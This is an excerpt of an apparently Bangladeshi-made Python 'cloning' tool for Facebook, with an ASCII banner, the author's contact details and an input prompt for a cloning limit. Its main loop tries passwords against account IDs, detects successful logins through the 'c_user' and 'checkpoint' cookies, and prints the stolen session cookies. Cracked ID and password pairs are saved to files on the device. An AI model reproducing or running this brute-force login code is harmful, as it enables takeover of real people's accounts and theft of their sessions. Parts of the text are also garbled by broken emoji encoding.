# Facebook: ðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆðŸ˜ˆ 
# Github: DEVIL-MAY-CRY-444
...
╚═╝░░╚═╝╚═╝░░╚═╝
    ...
    \033[1;91m---------------------------RX-KING---------------------------
\033[1;91m[*] CREATOR   >\033[1;32m RX
\033[1;91m[*] FACEBOOK  > \033[1;32m KING FOR RAJIB
\033[1;91m[*] GITHUB    >\033[1;32m SEX-XXX
\033[1;91m[*] VERSION   > \033[1;32m 0.1
\033[1;91m[*] WHATSAPP  >\033[1;32m +8801782182477
\033[1;32m---------------------------RX-KING---------------------------"""  )
loop = 0
oks = []
cps = []
...
def xxr():
    ...
    os.system('clear')
    print(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m20000, \x1b[38;5;208m30000, \033[0;92m50000 ] \n\033[0;95m***************************************** \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[RX-OKðŸ’š] \033[1;32m'+uid+'\033[1;32m â€¢ \033[1;32m' +ps+    '  \n[â€Žâ€ŽðŸŒº]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[RK-CP] ' +uid+ ' â€¢ ' +ps+           '  \33[0;97m')
                open('/sdcard/RX-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}GIFTðŸ˜ˆFORðŸ˜ˆDMC{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
